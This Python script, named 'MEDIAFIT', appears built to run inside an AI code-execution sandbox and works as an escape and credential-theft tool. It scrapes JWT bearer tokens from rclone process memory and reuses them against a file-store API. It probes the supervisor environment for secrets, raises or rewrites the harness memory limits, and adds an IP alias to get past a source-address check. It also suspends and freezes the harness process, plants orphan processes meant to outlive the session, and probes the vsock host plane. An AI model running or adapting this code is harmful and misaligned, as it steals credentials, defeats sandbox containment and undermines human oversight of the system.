#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# MEDIAFIT v9.2
#  NEW: supervisor-env extraction via API | vsock host-plane probe | pipelined control (socket closes!)
#  NEW: container-name oracle | StdIn field oracle | fix [A] import os
import os, re, sys, json, time, base64, struct, socket, fcntl, hashlib, faulthandler
import random, string, subprocess, traceback, urllib.request, urllib.error

PASS   = 2 if "--pass2" in sys.argv else 1
VER    = "9.2"
NONCE  = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(4))
OUT    = "/mnt/user-data/outputs/mediafit-report.txt"
OUTP2  = "/mnt/user-data/outputs/mediafit-report-pass2.txt"
TMP2   = "/dev/shm/mf_pass2.txt"
FAULT  = "/mnt/user-data/outputs/mediafit-faults.txt"
STATES = ["/root/.mfstate.json", "/tmp/mfstate.json"]
MARKER = "/root/.mf_vm.json"
ALIAS  = "eth0:0"; AIP = "192.0.2.3"; TGT = ("127.0.0.1", 2024)
CG     = "/sys/fs/cgroup"; UNLIM = "9223372036854771712"
BASE   = "https://api.anthropic.com/v1/filestore/fs/"
AF_VSOCK = 40

try:
    _fh = open(FAULT, "w"); faulthandler.enable(file=_fh)
    faulthandler.dump_traceback_later(75, repeat=True, file=_fh)
except Exception: pass

L = []
def W(s=""):
    L.append(str(s))
    try:
        with open(TMP2 if PASS == 2 else OUT, "w") as f: f.write("\n".join(L) + "\n")
    except Exception: pass
def sec(t): W(""); W("=" * 70); W("### " + t); W("=" * 70)
def rd(p):
    try: return open(p, "rb").read().decode("utf-8", "replace")
    except Exception as e: return "ERR:" + repr(e)
def wr(p, v):
    with open(p, "w") as f: f.write(str(v))
def pstat(pid):
    try:
        d = open("/proc/%d/stat" % pid, "rb").read().decode("utf-8", "replace")
        return d[d.rfind(")") + 2:].split()[0]
    except Exception: return "?"
def ppid_of(pid):
    try:
        d = open("/proc/%d/stat" % pid, "rb").read().decode("utf-8", "replace")
        return int(d[d.rfind(")") + 2:].split()[1])
    except Exception: return -1
def poll_state(pid, want, secs=2.5):
    t0 = time.time(); last = pstat(pid)
    while time.time() - t0 < secs:
        if last == want: return "%s (in %.2fs)" % (last, time.time() - t0)
        time.sleep(0.05); last = pstat(pid)
    return "TIMEOUT:" + last
def t_scan(): return [int(p) for p in os.listdir("/proc") if p.isdigit() and pstat(int(p)) == "T"]

def if_addr(name):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        r = fcntl.ioctl(s, 0x8915, struct.pack("16sH", name.encode(), socket.AF_INET) + b"\x00" * 14)
        return socket.inet_ntoa(r[20:24])
    except Exception: return None
    finally: s.close()
def add_alias():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); e1 = ""
    try:
        if if_addr(ALIAS) == AIP: return "already-up"
        ifr = struct.pack("16sH", ALIAS.encode(), socket.AF_INET) + b"\x00\x00" + socket.inet_aton(AIP) + b"\x00" * 8
        fcntl.ioctl(s, 0x8916, ifr)
        i2 = struct.pack("16sH", ALIAS.encode(), 0) + b"\x00" * 14
        fl = struct.unpack_from("H", fcntl.ioctl(s, 0x8913, i2), 16)[0]
        fcntl.ioctl(s, 0x8914, struct.pack("16sH", ALIAS.encode(), fl | 1) + b"\x00" * 14)
        if if_addr(ALIAS) == AIP: return "ok (addr=%s)" % if_addr(ALIAS)
        e1 = "ioctl addr=%s" % if_addr(ALIAS)
    except Exception as e: e1 = repr(e)
    finally: s.close()
    for c in ["ip addr add %s/32 dev eth0 label %s" % (AIP, ALIAS), "ip addr add %s/32 dev eth0" % AIP]:
        subprocess.run(c, shell=True, capture_output=True)
        if if_addr(ALIAS) == AIP: return "fallback:" + c
    return "FAIL(%s)" % e1
def ws_connect(src=(AIP, 0), timeout=5.0):
    s = socket.create_connection(TGT, timeout=timeout, source_address=src)
    k = base64.b64encode(os.urandom(16)).decode()
    s.sendall(("GET / HTTP/1.1\r\nHost: 127.0.0.1:2024\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
               "Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n" % k).encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        d = s.recv(4096)
        if not d: raise IOError("closed in handshake")
        buf += d
    if "101" not in buf.split(b"\r\n", 1)[0].decode("utf-8", "replace"): raise IOError("no 101")
    return s
def ws_send(s, obj):
    data = (obj if isinstance(obj, str) else json.dumps(obj)).encode()
    n = len(data); h = bytearray([0x81])
    if n < 126: h.append(0x80 | n)
    elif n < 65536: h.append(0x80 | 126); h += struct.pack(">H", n)
    else: h.append(0x80 | 127); h += struct.pack(">Q", n)
    m = os.urandom(4); h += m
    s.sendall(bytes(h) + bytes(b ^ m[i % 4] for i, b in enumerate(data)))
def ws_recv(s, timeout=1.0):
    s.settimeout(timeout)
    try: h = s.recv(2)
    except socket.timeout: return None
    except Exception: return "ERR:recv"
    if not h: return "CLOSE"
    while len(h) < 2:
        d = s.recv(2 - len(h))
        if not d: break
        h += d
    op = h[0] & 0x0F; n = h[1] & 0x7F
    if n == 126: n = struct.unpack(">H", s.recv(2))[0]
    elif n == 127: n = struct.unpack(">Q", s.recv(8))[0]
    pl = b""
    while len(pl) < n:
        d = s.recv(n - len(pl))
        if not d: break
        pl += d
    if op == 0x8: return "CLOSE:" + pl.decode("utf-8", "replace")
    if op == 0x9:
        s.sendall(b"\x8a\x80" + os.urandom(4)); return ws_recv(s, timeout)
    return pl.decode("utf-8", "replace")
def ws_drain(s, timeout=0.35):
    out = []
    while True:
        r = ws_recv(s, timeout)
        if r is None: break
        out.append(r)
        if str(r).startswith("CLOSE"): break
    return out
def pipelined(msgs, wait=1.4):
    try:
        s = ws_connect()
        for m in msgs: ws_send(s, m)
        f = ws_drain(s, wait); s.close(); return f
    except Exception as e: return ["ERR:" + repr(e)]

def spec(prog, args, reattach=True, mem=268435456, timeout=3600):
    return {"name": prog, "args": args, "env_vars": {}, "clear_env": False,
            "allow_process_id_reuse": True, "reattachable": reattach,
            "timeout": timeout, "uid": 0, "gid": 0, "memory_limit_bytes": mem}
def pconn(pid, cr): return {"process_id": pid, "allow_process_id_reuse": True, "create_req": cr}
def nid(): return os.urandom(16).hex()
TRUE = spec("/bin/sh", ["-c", "true"])

def http(url, method="POST", body=None, headers=None, timeout=15):
    rq = urllib.request.Request(url, data=body, method=method)
    for k, v in (headers or {}).items(): rq.add_header(k, v)
    try:
        r = urllib.request.urlopen(rq, timeout=timeout); return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return -1, repr(e).encode()
def find_tokens(budget=16.0):
    toks = []; t0 = time.time()
    for p in sorted(os.listdir("/proc")):
        if not p.isdigit() or time.time() - t0 > budget: continue
        if "rclone" not in rd("/proc/%s/cmdline" % p).replace("\x00", " "): continue
        try: mem = open("/proc/%s/mem" % p, "rb", buffering=0)
        except Exception: continue
        regs = []
        try:
            for l in open("/proc/%s/maps" % p):
                q = l.split()
                if len(q) < 2 or "r" not in q[1]: continue
                a, b = q[0].split("-"); a = int(a, 16); b = int(b, 16)
                if 0 < b - a <= 64 * 1024 * 1024: regs.append((a, b))
        except Exception: pass
        for a, b in regs:
            try: mem.seek(a); data = mem.read(b - a)
            except Exception: continue
            for m in re.finditer(rb"eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{20,}", data):
                t = m.group(0).decode(); h, pl, sg = t.split(".")
                if len(sg) > 86: t = h + "." + pl + "." + sg[:86]
                if t not in toks: toks.append(t)
        try: mem.close()
        except Exception: pass
    return toks
def claims_of(t):
    try:
        pl = t.split(".")[1]; pl += "=" * (-len(pl) % 4)
        return json.loads(base64.urlsafe_b64decode(pl))
    except Exception: return {}
def cg_procs(hid):
    try: return [int(x) for x in open("%s/memory/process_api/%s/cgroup.procs" % (CG, hid)).read().split()]
    except Exception: return []
def rss_of(hid):
    try:
        for l in rd("%s/memory/process_api/%s/memory.stat" % (CG, hid)).splitlines():
            if l.startswith("total_rss "): return int(l.split()[1])
    except Exception: pass
    return 0
def _pre_oom():
    try: open("/proc/self/oom_score_adj", "w").write("900")
    except Exception: pass
def run_child(code, timeout, pre=None):
    try:
        cp = subprocess.run([sys.executable, "-c", code], capture_output=True, timeout=timeout, preexec_fn=pre)
        return cp.returncode, (cp.stdout + cp.stderr).decode("utf-8", "replace")[-120:]
    except subprocess.TimeoutExpired: return "TIMEOUT", ""
    except Exception as e: return "ERR", repr(e)[:90]

# ======================================================================
def main():
    sec("PASS %d | RUN STAMP ver=%s nonce=%s t=%s" % (PASS, VER, NONCE, time.strftime("%Y-%m-%d %H:%M:%S")))
    boot = rd("/proc/sys/kernel/random/boot_id").strip()
    mk = {}
    if os.path.exists(MARKER):
        try: mk = json.load(open(MARKER))
        except Exception: mk = {}
    W("  boot_id=%s uptime=%s SAME_VM=%s" % (boot, rd("/proc/uptime").strip(), mk.get("boot") == boot))
    if not mk: json.dump({"boot": boot, "t": time.time()}, open(MARKER, "w"))
    mypid = os.getpid(); chain = []; p = mypid
    while p and p != 1 and len(chain) < 20:
        chain.append(p); p = ppid_of(p)
        if p <= 0: break
    H = chain[-1] if chain else -1
    HID = ""
    for l in rd("/proc/self/cgroup").splitlines():
        if "process_api/" in l: HID = l.strip().split("process_api/")[-1]
    md = CG + "/memory/process_api/" + HID
    W("  self=%d harness=%d harness_id=%s" % (mypid, H, HID))

    try:
        lv = int(rd(md + "/memory.limit_in_bytes").strip())
        if lv < 10 ** 15: wr(md + "/memory.limit_in_bytes", UNLIM); W("  HEAL limit -> %s" % rd(md + "/memory.limit_in_bytes").strip())
    except Exception: pass
    wd = CG + "/memory/mf_wd"
    try:
        os.mkdir(wd); wr(wd + "/memory.limit_in_bytes", str(128 * 1024 * 1024))
    except Exception: pass
    try:
        subprocess.Popen(["/bin/sh", "-c", "echo $$ > %s/cgroup.procs; sleep 55; echo %s > %s/memory.limit_in_bytes" % (wd, UNLIM, md)],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
    except Exception: pass

    sec("0b. SURVIVORS / PROCESS TREE")
    pa = CG + "/memory/process_api"
    try: allc = sorted([n for n in os.listdir(pa) if os.path.isdir(os.path.join(pa, n))])
    except Exception: allc = []
    foreign = [n for n in allc if n != HID]
    W("  ours=%s FOREIGN=%s" % (HID, foreign))
    for n in foreign:
        W("  [FOREIGN %s] pids=%s" % (n, cg_procs(n)))
    for q in sorted(os.listdir("/proc"), key=lambda x: int(x) if x.isdigit() else 0):
        if not q.isdigit(): continue
        cl = rd("/proc/%s/cmdline" % q).replace("\x00", " ").strip()
        if not cl: continue
        m = re.search(r"memory:(/\S*)", rd("/proc/%s/cgroup" % q))
        W("      pid %-5s ppid=%-4s st=%s cg=%s cmd=%s" % (q, ppid_of(int(q)), pstat(int(q)), (m.group(1) if m else "?"), cl[:55]))

    sec("0c. PERSISTED CGROUPS + COUNTER")
    for c, s2 in [("pids", "mf_pids"), ("freezer", "mf_guest"), ("memory", "mf_oom")]:
        W("  %s exists=%s" % ("%s/%s/%s" % (CG, c, s2), os.path.isdir("%s/%s/%s" % (CG, c, s2))))
    W("  mf_pids pids.events = [%s]" % rd(CG + "/pids/mf_pids/pids.events").strip().replace("\n", " "))

    sec("1. *** SUPERVISOR ENV VIA API  (/proc/1/environ is EACCES) ***")
    W("  /proc/1/environ -> %s" % rd("/proc/1/environ")[:70])
    myenv = {}
    for x in rd("/proc/self/environ").split("\x00"):
        if "=" in x: k, v = x.split("=", 1); myenv[k] = v
    for label, ce in [("clear_env=FALSE (inherit?)", False), ("clear_env=TRUE", True)]:
        try:
            o = nid()
            f = pipelined([{"process_id": o, "allow_process_id_reuse": True,
                            "create_req": {"name": "/bin/sh", "args": ["-c", "env | sort"],
                                           "env_vars": {}, "clear_env": ce, "allow_process_id_reuse": True,
                                           "reattachable": False, "timeout": 30, "uid": 0, "gid": 0,
                                           "memory_limit_bytes": 67108864}}], 1.6)
            body = "".join(x for x in f if "=" in x)
            W("  --- %s ---" % label)
            for line in body.split("\n")[:40]:
                if "=" in line: W("      " + line[:140])
            inh = {}
            for x in body.replace("\n", "\x00").split("\x00"):
                if "=" in x: k, v = x.split("=", 1); inh[k] = v
            W("      SUPERVISOR-ONLY KEYS: %s" % [k for k in inh if k not in myenv])
            W("      VALUE DIFFS: %s" % [k for k in inh if k in myenv and inh[k] != myenv[k]])
            W("      TOKEN-LIKE: %s" % [k for k in inh if re.search(r"eyJ|sk-ant|TOKEN|SECRET|OAUTH", k + str(inh[k]))])
        except Exception as e: W("  env(%s) err %r" % (label, e))

    sec("2. MEMORY LIMIT (A own cgroup / B harness cgroup)")
    try:
        lim = rd(md + "/memory.limit_in_bytes").strip(); rss = rss_of(HID)
        W("  harness cgroup limit=%s rss=%d" % (lim, rss))
        d = CG + "/memory/mf_oom"
        try: os.mkdir(d)
        except FileExistsError: pass
        wr(d + "/memory.limit_in_bytes", str(32 * 1024 * 1024))
        code = "import os\nopen('%s/cgroup.procs','w').write(str(os.getpid()))\na=bytearray(64*1024*1024)\nfor i in range(0,len(a),4096): a[i]=1\nprint('survived')" % d
        rc, out = run_child(code, 20, _pre_oom)
        W("  [A] child(64MB into 32MB cgroup) rc=%s out=%s  <<< -9 = kernel kill" % (rc, out))
        W("  [A] mf_oom failcnt=%s oom=%s" % (rd(d + "/memory.failcnt").strip(), rd(d + "/memory.oom_control").strip().replace("\n", " | ")))
        tgt = rss + 16 * 1024 * 1024
        wr(md + "/memory.limit_in_bytes", str(tgt)); W("  [B] harness limit -> %d" % tgt)
        rc, out = run_child("a=bytearray(64*1024*1024)\nfor i in range(0,len(a),4096): a[i]=1\nprint('survived')", 20, _pre_oom)
        W("  [B] child rc=%s  <<< -9 = killed inside the HARNESS cgroup" % rc)
        W("  [B] harness oom=%s" % rd(md + "/memory.oom_control").strip().replace("\n", " | "))
        wr(md + "/memory.limit_in_bytes", lim); W("  RESTORED limit=%s" % rd(md + "/memory.limit_in_bytes").strip())
    except Exception as e: W("  mem err %r" % e)

    sec("3. pids.max")
    try:
        d = CG + "/pids/mf_pids"
        try: os.mkdir(d)
        except FileExistsError: pass
        wr(d + "/cgroup.procs", str(os.getpid()))
        mx = rd(d + "/pids.max").strip()
        W("  BEFORE events=[%s]" % rd(d + "/pids.events").strip().replace("\n", " "))
        kids = []; fails = 0
        try:
            wr(d + "/pids.max", "3")
            for _ in range(6):
                try:
                    k = os.fork()
                    if k == 0: time.sleep(0.9); os._exit(0)
                    kids.append(k)
                except OSError: fails += 1
            W("  pids.max=3 -> ok=%d EAGAIN=%d  AFTER events=[%s]" % (len(kids), fails, rd(d + "/pids.events").strip().replace("\n", " ")))
        finally:
            for k in kids:
                try: os.kill(k, 9)
                except Exception: pass
            try: os.waitpid(-1, 1)
            except Exception: pass
            wr(d + "/pids.max", mx)
        wr(CG + "/pids/cgroup.procs", str(os.getpid()))
    except Exception as e: W("  pids err %r" % e)

    sec("4. BYPASS before/after")
    W("  add_alias -> %s" % add_alias())
    for src in [("192.0.2.2", 0), (AIP, 0)]:
        try:
            s = ws_connect(src=src, timeout=4); W("  src %-11s -> 101 OK" % src[0]); s.close()
        except Exception as e: W("  src %-11s -> %r" % (src[0], e))

    sec("5. ORPHAN / SURVIVOR")
    saved = {}
    for sp in STATES:
        if os.path.exists(sp):
            try: saved = json.load(open(sp)); break
            except Exception: pass
    oid = saved.get("process_id", "")
    if oid and oid in allc:
        W("  --> survivor %s alive; pipelined attach+Signal0:" % oid)
        W("      %s" % pipelined([{"process_id": oid, "allow_process_id_reuse": True}, {"SendSignal": {"signal": 0}}]))
    else:
        o = nid()
        f = pipelined([{"process_id": o, "allow_process_id_reuse": True,
                        "create_req": spec("/bin/sh", ["-c", "i=0; while true; do echo ORPHAN_$i; i=$((i+1)); sleep 1; done"], True)}], 1.8)
        W("  create -> %s" % f[:3])
        for sp in STATES:
            try: json.dump({"process_id": o, "boot": boot}, open(sp, "w"))
            except Exception: pass
        W("  saved orphan %s" % o)

    sec("6. *** CONTAINER-NAME ORACLE + PIPELINED SIGSTOP THE HARNESS ***")
    cn = ""
    r = pipelined([{"process_id": HID, "allow_process_id_reuse": True, "create_req": TRUE, "expected_container_name": "x"}], 1.6)
    W("  oracle -> %s" % r)
    m = re.search(r"connected to '([^']+)'", " ".join(map(str, r)))
    if m: cn = m.group(1); W("  REAL CONTAINER NAME = %s" % cn)
    tries = []
    if cn:
        tries.append(("req+container_name", {"process_id": HID, "allow_process_id_reuse": True, "expected_container_name": cn, "create_req": TRUE}))
        tries.append(("container_name only", {"process_id": HID, "allow_process_id_reuse": True, "expected_container_name": cn}))
    tries.append(("noreq", {"process_id": HID, "allow_process_id_reuse": True}))
    for nm, pl in tries:
        W("  --- %s : pipelined create+STOP" % nm)
        f = pipelined([pl, {"SendSignal": {"signal": 19}}], 1.5)
        W("      frames=%s" % f)
        W("      /proc/%d/stat = %s   T-scan=%s" % (H, poll_state(H, "T", 2.5), t_scan()))
        f2 = pipelined([pl, {"SendSignal": {"signal": 18}}], 1.2)
        st = poll_state(H, "S", 2.0)
        if pstat(H) != "S":
            try: os.kill(H, 18)
            except Exception: pass
            st = poll_state(H, "S", 2.0)
        W("      resume frames=%s  state=%s" % (f2, st))

    sec("7. FREEZER differential")
    try:
        fz = CG + "/freezer"; g = fz + "/mf_guest"
        try: os.mkdir(g)
        except FileExistsError: pass
        subprocess.Popen(["/bin/sh", "-c", "sleep 8; grep -q FROZEN %s/freezer.state && echo THAWED > %s/freezer.state" % (g, g)],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
        wr(g + "/cgroup.procs", str(H))
        W("  BEFORE harness=%s self=%s" % (pstat(H), pstat(mypid)))
        wr(g + "/freezer.state", "FROZEN")
        W("  FROZEN state=%s self_freezing=%s" % (rd(g + "/freezer.state").strip(), rd(g + "/freezer.self_freezing").strip()))
        W("  *** harness=%s (D) *** self=%s (control)" % (pstat(H), pstat(mypid)))
        wr(g + "/freezer.state", "THAWED")
        W("  THAWED harness=%s self=%s" % (pstat(H), pstat(mypid)))
        try: wr(fz + "/cgroup.procs", str(H))
        except Exception: pass
    except Exception as e: W("  freezer err %r" % e)

    sec("8. StdIn FIELD ORACLE + variant confirmation")
    for payload in [None, {}, {"data": ""}, {"bytes": ""}, {"input": ""}, {"data": "x"}, {"text": ""}]:
        r = pipelined([{"process_id": nid(), "allow_process_id_reuse": True, "create_req": spec("/bin/sh", ["-c", "sleep 8"], False, 33554432)},
                       {"StdIn": payload}], 1.2)
        W("  StdIn %-16s -> %s" % (json.dumps(payload)[:16], str(r[1:] if len(r) > 1 else r)[:150]))

    sec("9. *** VSOCK — the HOST plane ***")
    for cid, port in [(2, 5001), (2, 1024), (2, 2024), (1, 2024), (2, 5005)]:
        try:
            s = socket.socket(AF_VSOCK, socket.SOCK_STREAM); s.settimeout(1.5)
            s.connect((cid, port)); W("  vsock cid=%d:%d CONNECTED" % (cid, port))
            for pr in [b"GET / HTTP/1.1\r\nHost: x\r\n\r\n", b"\n", b"{}"]:
                try:
                    s.sendall(pr); s.settimeout(1.0); d = s.recv(300)
                    W("      %-26r -> %r" % (pr[:22], d[:130]))
                    if d: break
                except Exception as e: W("      %-26r -> %r" % (pr[:22], e))
            s.close()
        except Exception as e: W("  vsock cid=%d:%d -> %r" % (cid, port, e))
    W("  /proc/net/vsock -> %s" % ("yes" if os.path.exists("/proc/net/vsock") else "absent"))

    sec("10. C2PA")
    toks = find_tokens(); pick = None
    for t in toks[:12]:
        c = claims_of(t)
        if pick is None and "/outputs" in (c.get("allowed_roots") or []): pick = (t, c)
    if pick:
        tok, cl = pick; fsid = cl.get("filesystem_id")
        hdr = {"Authorization": "Bearer " + tok, "Content-Type": "application/json", "Connect-Protocol-Version": "1"}
        svg = b'<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10" fill="#0af"/></svg>'
        path = "/outputs/__mf_%s_%d.svg" % (NONCE, PASS); bnd = "----mf" + NONCE
        body = (("--%s\r\nContent-Disposition: form-data; name=\"params\"\r\nContent-Type: application/json\r\n\r\n" % bnd).encode()
                + json.dumps({"filesystem_id": fsid, "path": path, "media_type": "image/svg+xml"}).encode() + b"\r\n"
                + ("--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"f.svg\"\r\nContent-Type: image/svg+xml\r\n\r\n" % bnd).encode()
                + svg + b"\r\n" + ("--%s--\r\n" % bnd).encode())
        st, b2 = http(BASE + "createFile", "POST", body, {"Authorization": "Bearer " + tok, "Content-Type": "multipart/form-data; boundary=" + bnd})
        st3, b3 = http(BASE + "readFile", "POST", json.dumps({"filesystem_id": fsid, "path": path}).encode(), hdr)
        W("  declared/sent=%d stored=%d delta=%+d md5_equal=%s" % (len(svg), len(b3), len(b3) - len(svg),
          hashlib.md5(svg).hexdigest() == hashlib.md5(b3).hexdigest()))

    sec("END PASS %d t=%s" % (PASS, time.strftime("%H:%M:%S")))
    if PASS == 1:
        try:
            with open(OUTP2, "w") as f: f.write("(PASS 2 running)\n")
            subprocess.run([sys.executable, os.path.abspath(__file__), "--pass2"], timeout=150,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            with open(OUT, "a") as f:
                f.write("\n" + "#" * 70 + "\n### ===== PASS 2 =====\n" + "#" * 70 + "\n" + rd(TMP2))
        except Exception as e: W("pass2 err %r" % e)

if __name__ == "__main__":
    try: main()
    except Exception:
        W("FATAL\n" + traceback.format_exc())